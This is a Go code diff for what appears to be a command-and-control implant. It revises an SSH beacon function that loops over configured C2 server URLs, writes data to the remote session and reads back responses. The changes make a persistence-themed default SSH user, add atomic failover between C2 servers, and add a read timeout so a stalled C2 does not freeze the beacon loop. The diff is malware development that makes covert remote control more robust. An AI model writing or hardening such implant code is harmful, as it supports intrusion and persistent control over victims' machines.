@@ -27,7 +27,7 @@ func initSSHConfig() {
 	sshInitOnce.Do(func() {
 		sshUser = SSHUserStr
 		if sshUser == "" {
-			sshUser = "forgec2"
+			sshUser = persistencePrefix
 		}
 		sshPassword = SSHPasswordStr
 		if SSHKeyStr != "" {
@@ -86,10 +86,11 @@ func subtleEqualSSHKeys(a, b ssh.PublicKey) bool {
 
 func sendSSHBeacon(body []byte) []byte {
 	initSSHConfig()
-	startIdx := currentC2Idx
-	for i := 0; i < len(C2URLs); i++ {
-		idx := (startIdx + i) % len(C2URLs)
-		c2URL := C2URLs[idx]
+	startIdx := int(currentC2Idx.Load())
+	urls := c2URLsSnapshot()
+	for i := 0; i < len(urls); i++ {
+		idx := (startIdx + i) % len(urls)
+		c2URL := urls[idx]
 
 		if !strings.HasPrefix(c2URL, "ssh://") {
 			continue
@@ -165,7 +166,27 @@ func sendSSHBeacon(body []byte) []byte {
 		stdin.Write(body)
 		stdin.Close()
 
-		response, readErr := io.ReadAll(stdout)
+		type sshReadResult struct {
+			data []byte
+			err  error
+		}
+		sshReadDone := make(chan sshReadResult, 1)
+		go func() {
+			data, e := io.ReadAll(io.LimitReader(stdout, 16*1024*1024))
+			sshReadDone <- sshReadResult{data, e}
+		}()
+		var response []byte
+		var readErr error
+		select {
+		case r := <-sshReadDone:
+			response, readErr = r.data, r.err
+		case <-time.After(30 * time.Second):
+			// A stalled C2 on the SSH session would otherwise block io.ReadAll
+			// forever and freeze the entire beacon loop; tear it down.
+			session.Close()
+			client.Close()
+			return nil
+		}
 		session.Wait()
 		session.Close()
 		client.Close()
@@ -177,7 +198,7 @@ func sendSSHBeacon(body []byte) []byte {
 			continue
 		}
 
-		currentC2Idx = idx
+		currentC2Idx.Store(int32(idx))
 		if Debug {
 			fmt.Printf("[+] SSH Beacon OK from %s, response %d bytes\n", addr, len(response))
 		}
